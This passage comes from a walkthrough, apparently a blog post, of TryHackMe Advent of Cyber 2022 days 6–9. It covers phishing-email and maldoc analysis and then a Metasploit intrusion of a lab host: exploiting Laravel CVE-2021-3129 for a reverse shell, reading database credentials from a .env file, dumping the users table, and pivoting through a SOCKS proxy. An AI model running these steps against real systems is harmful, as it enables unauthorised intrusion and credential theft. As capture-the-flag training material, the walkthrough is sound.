Elf</code></p><p><strong>What is the X-spam score?</strong> <code class="language-plaintext highlighter-rouge">3</code></p><p><strong>What is hidden in the value of the Message-ID field?</strong> We see the string <code class="language-plaintext highlighter-rouge">QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==</code>, which looks like a base64 encoded message, so we decode it like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ubuntu@ip-10-10-102-13:~/Desktop$ echo QW9DMjAyMl9FbWFpbF9BbmFseXNpcw== | base64 -d 
AoC2022_Email_Analysis
</pre></table></code></div></div><p>So the answer is <code class="language-plaintext highlighter-rouge">AoC2022_Email_Analysis</code>.</p><p><strong>Visit the email reputation check website provided in the task. What is the reputation result of the sender’s email address?</strong> So we go to <a href="https://emailrep.io/">this</a> website, which they provided in the task, and we search for <code class="language-plaintext highlighter-rouge">chief.elf@santaclaus.thm</code></p><p><img data-src="/images/adventofcyber_day6_risky.png" alt="attachment" data-proofer-ignore></p><p>So the answer is <code class="language-plaintext highlighter-rouge">risky</code>.</p><p><strong>Check the attachments. What is the filename of the attachment?</strong> If we scroll down the output of the command, we see the “Attachment Extracting” part, where we see that the filename of the attachment is <code class="language-plaintext highlighter-rouge">Division_of_labour-Load_share_plan.doc</code></p><p><img data-src="/images/adventofcyber_day6_attachment.png" alt="attachment" data-proofer-ignore></p><p><strong>What is the hash value of the attachment?</strong> To calculate that, let’s run the following commands:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ubuntu@ip-10-10-102-13:~/Desktop$ cd eml_attachments/
ubuntu@ip-10-10-102-13:~/Desktop/eml_attachments$ sha256sum Division_of_labour-Load_share_plan.doc 

0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467  Division_of_labour-Load_share_plan.doc
</pre></table></code></div></div><p>So the hash is <code class="language-plaintext highlighter-rouge">0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467</code></p><p><strong>Visit the Virus Total website and use the hash value to search. Navigate to the behaviour section. What is the second tactic marked in the Mitre ATT&amp;CK section?</strong> Let’s go to the <a href="https://www.virustotal.com/gui/home/search">Virus Total</a> search tab, and enter the hash. Once found, we can navigate to the “Behavior” tab, and then we scroll down to the “Mitre ATT&amp;CK” section, and there we see that the second tactic is <code class="language-plaintext highlighter-rouge">Defense Evasion</code>.</p><p><strong>Visit the InQuest website and use the hash value to search. What is the subcategory of the file?</strong> Let’s go to the <a href="https://labs.inquest.net/">InQuest</a> website, and search for the hash on the “Indicator Lookup”. Once it finds a match, let’s click on that and see that Subcategory: <code class="language-plaintext highlighter-rouge">macro_hunter</code></p><h1 id="day-7---maldocs-roasting-on-an-open-fire-cyberchef">Day 7 - Maldocs roasting on an open fire (CyberChef)</h1><p>Today we will be taking a look at <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, and learning what we can use it for. Let’s start by starting the machine, and going to Firefox, where there is an offline version of CyberChef on the bookmarks</p><p><strong>What is the version of CyberChef found in the attached VM?</strong> Once we enter CyberChef, on the url we can see that the version is <code class="language-plaintext highlighter-rouge">9.49.0</code>.</p><p><strong>How many recipes were used to extract URLs from the malicious doc?</strong> <code class="language-plaintext highlighter-rouge">10</code>. Those are the following ones:</p><ol><li><strong>Strings</strong><li><strong>Find/Replace</strong> : To remove all <code class="language-plaintext highlighter-rouge">[</code>, <code class="language-plaintext highlighter-rouge">]</code>, and end of lines (<code class="language-plaintext highlighter-rouge">\n</code>).<li><strong>Drop bytes</strong> : To remove the initial text and keep only the base64 encoded text.<li><strong>From Base64</strong> : to decode the text.<li><strong>Decode text</strong> : to decode it from <code class="language-plaintext highlighter-rouge">UTF-16LE(1200</code> encoding.<li><strong>Find/Replace</strong> : to remove all <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">(</code>, <code class="language-plaintext highlighter-rouge">)</code>, <code class="language-plaintext highlighter-rouge">+</code>, <code class="language-plaintext highlighter-rouge">"</code><li><strong>Find/Replace</strong> : to replace <code class="language-plaintext highlighter-rouge">]b2H_</code> for <code class="language-plaintext highlighter-rouge">http</code>.<li><strong>Extract URLs</strong><li><strong>Split</strong> : to indicate where each url finishes.<li><strong>Defang URL</strong> : to make sure the URLs are not clickable.</ol><p><strong>We found a URL that was downloading a suspicious file; what is the name of that malware?</strong> <code class="language-plaintext highlighter-rouge">mysterygift.exe</code>.</p><p><strong>What is the last defanged URL of the bandityeti domain found in the last step?</strong> <code class="language-plaintext highlighter-rouge">hxxps[://]cdn[.]bandityeti[.]THM/files/index/</code></p><p><strong>What is the ticket found in one of the domains? (Format: Domain/GOLDEN_FLAG)</strong> The domain is <code class="language-plaintext highlighter-rouge">https://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG</code>, so the ticket is <code class="language-plaintext highlighter-rouge">THM_MYSTERY_FLAG</code>.</p><h1 id="day-8---last-christmas-i-gave-you-my-eth-smart-contracts-draft">Day 8 - Last Christmas I gave you my ETH (Smart Contracts) (DRAFT)</h1><p>Today we will be taking a look at smart contracts and how to exploit them. For that, we need to download the files tryhackme provides us with, and unzip it. We will then be using <a href="https://remix.ethereum.org/">Remix IDE</a> to test and deploy contracts in a safe and controlled environment like if they were on a public blockchain.</p><div style="padding: 15px; border: 1px solid transparent; border-color: transparent; margin-bottom: 20px; border-radius: 4px; color: #a94442; background-color: #f2dede; border-color: #ebccd1;"> Writeup for this challenge still incoming ....</div><p><strong>What flag is found after attacking the provided EtherStore Contract?</strong> <code class="language-plaintext highlighter-rouge">flag{411_ur_37h_15_m1n3}</code></p><h1 id="day-9---dock-the-halls-pivoting">Day 9 - Dock the halls (Pivoting)</h1><h2 id="compromising-a-machine-through-metasploit"><span class="mr-2">Compromising a machine through metasploit</span><a href="#compromising-a-machine-through-metasploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>The IP address assigned to me when starting the machine is <code class="language-plaintext highlighter-rouge">10.10.81.47</code>, substitute it for the one you receive.</p></blockquote><p><strong>Deploy the attached VM, and wait a few minutes. What ports are open?</strong> To see the open ports, we can use <code class="language-plaintext highlighter-rouge">nmap</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>└─$ nmap -sV 10.10.81.47                                                                        
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-11 13:12 CET
Nmap scan report for 10.10.81.47
Host is up (0.044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
</pre></table></code></div></div><p>We can see that the only open port is <code class="language-plaintext highlighter-rouge">80</code>.</p><p><strong>What framework is the web application developed with?</strong> To gain a bit more information about the website, we can try to visualize it on our browser. For that, let’s navigate to <code class="language-plaintext highlighter-rouge">http://10.10.81.47</code> (Since <code class="language-plaintext highlighter-rouge">80</code> is the default port for <code class="language-plaintext highlighter-rouge">http</code>, the browser already goes there without us indicating it).</p><p>On the bottom right of the website we can see <code class="language-plaintext highlighter-rouge">Laravel v8.26.1 (PHP v7.4.30)</code>. The answer to this question is then <code class="language-plaintext highlighter-rouge">Laravel</code></p><p>Since we now have more information on the website (we know it’s using laravel), we can look for specific exploits for it. For that we will use the tool <code class="language-plaintext highlighter-rouge">Metasploit</code>.</p><div style="padding: 15px; border: 1px solid transparent; border-color: transparent; margin-bottom: 20px; border-radius: 4px; color: #a94442; background-color: #f2dede; border-color: #ebccd1;"> Make sure your tool is updated. I had a hard time here since my metasploit was not up to date and so it was not showing me the CVE tryhackme was looking for. For that, you can do : apt update; apt install metasploit-framework</div><p>To enter metasploit we use the command <code class="language-plaintext highlighter-rouge">msfconsole</code>, and once we get the <code class="language-plaintext highlighter-rouge">msf6&gt;</code> prompt, we can type <code class="language-plaintext highlighter-rouge">search laravel</code> to look for modules containing something related to laravel.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>└─$ msfconsole
...
msf6 &gt; search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce
</pre></table></code></div></div><p>We see that we get two exploits as an answer. The first one (number 0) looks like it has something to do with serialization, we’ll skip that for now. The second one (number 1) looks more interesting. As it says in the last line, we can now type <code class="language-plaintext highlighter-rouge">info 1</code> to get information on that module.</p><p>If we scroll to the bottom of the information, we can see a link on the <em>References</em> part, which has a link to a cve. That will be the answer to the next question:</p><p><strong>What CVE is the application vulnerable to?</strong> ‘CVE-2021-3129’</p><p>Since we found an exploit which could work on that application, now it’s trying to run it. For that, we first need to <code class="language-plaintext highlighter-rouge">use</code> the exploit and <code class="language-plaintext highlighter-rouge">set</code> the necessary parameters. To see the parameters we use <code class="language-plaintext highlighter-rouge">show info</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>msf6 &gt; use 1
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; show options

Module options (exploit/multi/php/ignition_laravel_debug_rce):

   Name       Current Setting              Required  Description
   ----       ---------------              --------  -----------
   LOGFILE                                 no        Laravel log file absolute path
   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80                           yes       The target port (TCP)
   SSL        false                        no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
   VHOST                                   no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
</pre></table></code></div></div><p>We can see that the parameters or options which have <code class="language-plaintext highlighter-rouge">Required=yes</code> are:</p><ul><li><strong>RHOSTS</strong> : the remote host (the ip given to us for the challenge)<li><strong>RPORT</strong> : the remote port. In this case it’s pointing to the default one, which is already good for us<li><strong>LHOST</strong> : our listener host we will use<li><strong>LPORT</strong> : the listen port</ul><p>To make sure that the machine is vulnerable, we can set the <code class="language-plaintext highlighter-rouge">rhosts</code> option and ask metasploit to <code class="language-plaintext highlighter-rouge">check</code> for us if it’s vulnerable:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; set rhosts 10.10.81.47
rhosts =&gt; 10.10.81.47

msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; check
[*] Checking component version to 10.10.81.47:80
[*] 10.10.81.47:80 - The target appears to be vulnerable.
</pre></table></code></div></div><p>BINGO! So now we can set the other parameters and <code class="language-plaintext highlighter-rouge">run</code> the exploit. We set <code class="language-plaintext highlighter-rouge">lhost</code> to our IP (which we can find via the <code class="language-plaintext highlighter-rouge">ifconfig</code> command), and then we <code class="language-plaintext highlighter-rouge">run</code> it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; set lhost tun0
lhost =&gt; tun0

msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; run
[*] Started reverse TCP handler on tun0:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.81.47:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (tun0:4444 -&gt; 10.10.81.47:50100) at 2022-12-12 23:16:59 +0100

</pre></table></code></div></div><p>And after that, we got our shell! If we want to do something else for now, but keep the session, we can type <code class="language-plaintext highlighter-rouge">background</code>, and then get it back with the <code class="language-plaintext highlighter-rouge">sessions</code> command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; sessions
Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               tun0:4444 -&gt; 10.10.81.47:50100 (10.10.81.47)
</pre></table></code></div></div><p><strong>What command can be used to upgrade the last opened session to a Meterpreter session?</strong> We can search on the output of <code class="language-plaintext highlighter-rouge">sessions</code> for the one we need, but to open the last one, regardless of the index, we can do <code class="language-plaintext highlighter-rouge">sessions -u -1</code> (which is the answer to the question).</p><h2 id="pivoting-to-the-db"><span class="mr-2">Pivoting to the DB</span><a href="#pivoting-to-the-db" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we managed to compromise the first machine, and we have a basic raw shell and the meterepreter session that we just opened in that last question. That session is more stable and allows us to do more stuff.</p><p>Now we can use this meterpreter session with the command <code class="language-plaintext highlighter-rouge">sessions -i</code> and the index of the session, and start listing the files for something interesting:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &gt; ls
Listing: /var/www/html
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  603   fil   2022-09-11 02:44:10 +0200  .htaccess
100644/rw-r--r--  0     fil   2022-09-11 02:44:10 +0200  favicon.ico
100644/rw-r--r--  1731  fil   2022-09-11 02:44:10 +0200  index.php
100644/rw-r--r--  24    fil   2022-09-11 02:44:10 +0200  robots.txt
100644/rw-r--r--  1194  fil   2022-09-11 02:44:10 +0200  web.config

meterpreter &gt; ls /
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2022-09-13 21:39:42 +0200  .dockerenv
040755/rwxr-xr-x  4096  dir   2022-09-13 11:48:51 +0200  bin
040755/rwxr-xr-x  4096  dir   2022-09-03 14:10:00 +0200  boot
040755/rwxr-xr-x  340   dir   2022-12-12 23:08:08 +0100  dev
040755/rwxr-xr-x  4096  dir   2022-09-13 21:39:42 +0200  etc
</pre></table></code></div></div><p>We see here the answer to the next question. <strong>What file indicates a session has been opened within a Docker container?</strong> <code class="language-plaintext highlighter-rouge">/.dockerenv</code></p><p><strong>What file often contains useful credentials for web applications?</strong> In Laravel, the application will likely contain a <code class="language-plaintext highlighter-rouge">.env</code> file that defines many common environment variables. In this case we can find it with the command <code class="language-plaintext highlighter-rouge">ls -la /var/www</code>. The answer to this question is then <code class="language-plaintext highlighter-rouge">.env</code>.</p><p>We can then check out the contents of this file. We see many things, but for now, the following lines look really interesting:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>meterpreter &gt; cat /var/www/.env

...
DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=postgres
DB_USERNAME=postgres
DB_PASSWORD=postgres
...
</pre></table></code></div></div><p>We see that there is a postgres database somewhere, which we can potentially access since we have credentials. We don’t know the IP address to access it, but metasploit can help us with that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>meterpreter &gt; resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
</pre></table></code></div></div><p>Bingo! So now we know how to access it. Let’s get some help from metasploit to see the structure of the DB and access it. For that, let’s first <code class="language-plaintext highlighter-rouge">background</code> the meterpreter session we are on.</p><p>To interact with the postgres DB, let’s look for <code class="language-plaintext highlighter-rouge">search postgres</code> on metasploit to see if there is something it can help us with:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; search postgres

Matching Modules
================
   #   Name                                              Description
   -   ----                                              -----------
...
   16  auxiliary/scanner/postgres/postgres_schemadump    Postgres Schema Dump
...
</pre></table></code></div></div><p>Number 16 looks interesting, let’s use it with <code class="language-plaintext highlighter-rouge">use 16</code>. We look at the options with <code class="language-plaintext highlighter-rouge">show options</code>, and we only need to set the <code class="language-plaintext highlighter-rouge">RHOSTS</code> option. For that let’s do <code class="language-plaintext highlighter-rouge">set rhosts 172.28.101.51</code> (the DB’s IP).</p><p>This is the first part, but metasploit will never be able to show us the DB’s structure just like that, since it doesn’t have visibility on the IP <code class="language-plaintext highlighter-rouge">172.28.101.51</code> (it’s on an internal network). For that, we will have to indicate to metasploit that every time we talk to <code class="language-plaintext highlighter-rouge">172.28.101.51</code>, we want it to route it through the meterpreter session we created on the compromised host (since that host does have visibility on the DB). We will use the <code class="language-plaintext highlighter-rouge">route add</code> command indicating a specific IP and subnet <code class="language-plaintext highlighter-rouge">172.28.101.51/32</code> in this cases, and the session we want to use (it can be seen executing <code class="language-plaintext highlighter-rouge">sessions</code>, in this cases it’s the <code class="language-plaintext highlighter-rouge">2</code>).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>msf6 auxiliary(scanner/postgres/postgres_schemadump) &gt; route add 172.28.101.51/32 2
[*] Route added
msf6 auxiliary(scanner/postgres/postgres_schemadump) &gt; route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.28.101.51      255.255.255.255    Session 2
</pre></table></code></div></div><p>Now we can finally run the auxiliary <em>auxiliary/scanner/postgres/postgres_schemadump</em>, and metasploit will be able to reach it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre>msf6 auxiliary(scanner/postgres/postgres_schemadump) &gt; run
[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
[+] Postgres SQL Server Schema 
 Host: 172.28.101.51 
 Port: 5432 
 ====================
---
- DBName: postgres
  Tables:
  - TableName: users_id_seq
    Columns:
    - ColumnName: last_value
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: log_cnt
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: is_called
      ColumnType: bool
      ColumnLength: '1'
  - TableName: users
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'
    - ColumnName: username
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: password
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: created_at
      ColumnType: timestamp
      ColumnLength: '8'
    - ColumnName: deleted_at
      ColumnType: timestamp
      ColumnLength: '8'
  - TableName: users_pkey
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</pre></table></code></div></div><p>Amazing! Now we can see the schema dump of the DB. We see there are three tables (<code class="language-plaintext highlighter-rouge">users_id_seq</code>, <code class="language-plaintext highlighter-rouge">users</code> and <code class="language-plaintext highlighter-rouge">users_pkey</code>), and that probably the most interesting table for us is the <code class="language-plaintext highlighter-rouge">users</code> one, since it contains usernames and passwords. Let’s try to access this data. For this, we will use the auxiliary in number 11 when we search for <code class="language-plaintext highlighter-rouge">search postgres</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; search postgres

Matching Modules
================
   #   Name                                              Description
   -   ----                                              -----------
...
   11  auxiliary/admin/postgres/postgres_sql             PostgreSQL Server Generic Query
...
</pre></table></code></div></div><p>We run <code class="language-plaintext highlighter-rouge">use 11</code> and check the options with <code class="language-plaintext highlighter-rouge">show options</code>. We can see that apart from setting the <code class="language-plaintext highlighter-rouge">RHOSTS</code> option, we will also need to set the <code class="language-plaintext highlighter-rouge">DATABASE</code> and <code class="language-plaintext highlighter-rouge">SQL</code> options to <code class="language-plaintext highlighter-rouge">postgres</code> and the query we want to execute, respectively.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>msf6 auxiliary(admin/postgres/postgres_sql) &gt; set rhosts 172.28.101.51
rhosts =&gt; 172.28.101.51
msf6 auxiliary(admin/postgres/postgres_sql) &gt; set database postgres
database =&gt; postgres
msf6 auxiliary(admin/postgres/postgres_sql) &gt; set sql "SELECT * from users;"
msf6 auxiliary(admin/postgres/postgres_sql) &gt; run
[*] Running module against 172.28.101.51
Query Text: 'SELECT * from users;'
==================================
    id  username  password  created_at                  deleted_at
    --  --------  --------  ----------                  ----------
    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
</pre></table></code></div></div><p>With this output, we can now answer the next two questions:</p><p><strong>What database table contains useful credentials?</strong> <code class="language-plaintext highlighter-rouge">users</code></p><p><strong>What is Santa’s password?</strong> <code class="language-plaintext highlighter-rouge">p4$$w0rd</code></p><h2 id="pivoting-to-the-root-machine"><span class="mr-2">Pivoting to the root machine</span><a href="#pivoting-to-the-root-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we have credentials. What could we use them for?</p><p>We know we compromised a docker instance, which means there has to be a root machine which controls the docker instance. That is probably the final machine we need to pivot to. After looking into it for a while, I found out that the default IP address of the gateway between the Docker host and the bridge network is <code class="language-plaintext highlighter-rouge">172.17.0.1</code>.</p><p>We can add the route to this machine with the command <code class="language-plaintext highlighter-rouge">route add 172.17.0.1/32 -1</code>, in the same way we added the DB’s IP previously.</p><p>Now, we will use metasploit as a proxy. For that, let’s search for <code class="language-plaintext highlighter-rouge">search socks</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>msf6 &gt; search socks
Matching Modules
================
   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal
</pre></table></code></div></div><p>We will use the first one in the list, so let’s just type <code class="language-plaintext highlighter-rouge">use 0</code>, and <code class="language-plaintext highlighter-rouge">run</code> it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>msf6 &gt; use 0
msf6 auxiliary(server/socks_proxy) &gt; run
msf6 auxiliary(server/socks_proxy) &gt; jobs
Jobs
====
  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
</pre></table></code></div></div><p>We can see that after we run it, it will show on <code class="language-plaintext highlighter-rouge">jobs</code>. We need to take note of the port we get when we show the options for this auxiliary socks_proxy:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msf6 auxiliary(server/socks_proxy) &gt; show info
...
Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  SRVPORT   1080             yes       The port to listen on
  ...
</pre></table></code></div></div><p>So it’s <code class="language-plaintext highlighter-rouge">1080</code>. We can now go to another terminal, still inside Kali Linux but outside Metasploit, and use Metasploit as a proxy, thanks to that auxiliary job we are still running. We now need to add a new line to the configuration file of <code class="language-plaintext highlighter-rouge">proxychains</code> (<code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code>). That will allow us to just use this command in front of every other command and use the defined proxy. We have to add the line <code class="language-plaintext highlighter-rouge">socks5 127.0.0.1 1080</code> (and remote or comment the other proxy there). The end of the file should look something like that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
socks5 127.0.0.1 1080
